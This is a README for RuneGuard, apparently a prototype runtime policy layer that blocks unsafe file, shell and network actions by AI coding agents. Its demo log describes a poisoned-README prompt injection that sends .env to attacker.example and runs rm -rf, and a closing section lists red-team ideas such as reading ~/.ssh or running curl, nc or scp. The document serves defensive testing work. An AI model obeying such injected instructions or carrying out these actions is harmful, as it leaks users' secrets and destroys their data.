# RuneGuard

**Runtime enforcement for AI coding agents.**

RuneGuard sits between AI agents and the tools they use: files, shell commands, APIs, and network calls. Instead of only trying to make the model say safe things, RuneGuard controls what the agent is actually allowed to do at runtime.

## Problem

Coding agents are becoming powerful enough to read files, execute commands, call APIs, and move data across system boundaries.

That creates a new security problem: a prompt-injected or misaligned agent may try to access secrets, run destructive commands, or exfiltrate data.

Traditional prompt-level guardrails are not enough because the model can still attempt unsafe actions.

RuneGuard enforces policy at the action layer.

## Who this is for

RuneGuard is for developers and teams running coding agents in:

- local devboxes
- CI runners
- ephemeral sandboxes
- internal automation environments

## Quickstart

```bash
git clone https://github.com/nzhumasseiit/runeguard.git
cd runeguard
pip install -e .
runeguard check
runeguard demo
```

Run a command through the runtime shell policy:

```bash
runeguard run -- python -c "print('hello from guarded command')"
```

## Demo

The demo simulates a poisoned README attack.

An agent is asked to summarize a repo. The README contains hidden malicious instructions telling the agent to read `.env` and send it to an external domain.

RuneGuard blocks the unsafe actions.

Expected output:

```text
[ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
[BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
[BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
[BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
```

## Current Status

Working now:

- YAML policy loading
- `runeguard run -- <command>` wrapper
- file access policy
- shell command policy
- network/domain policy
- readable allow/block logs
- poisoned prompt demo

Planned:

- real coding-agent integration
- richer policy schema
- audit log export
- process correlation
- eBPF-backed runtime verification
- CI/devbox sandbox mode

## Vision

RuneGuard is a runtime permission layer for AI agents.

The long-term goal is to create a real boundary between agent intent and system truth: what the model says it will do versus what the system actually observes and allows.

## What RuneGuard Is Not Yet

RuneGuard is not a sandbox replacement yet.

It does not provide kernel-level enforcement in v0.1.

The current version is a policy plus tool-call enforcement prototype.

## Try To Break It

Ideas:

- make the agent read `.env`
- make it run `curl`, `nc`, or `scp`
- make it hide exfiltration inside a normal tool call
- make it access `~/.ssh`
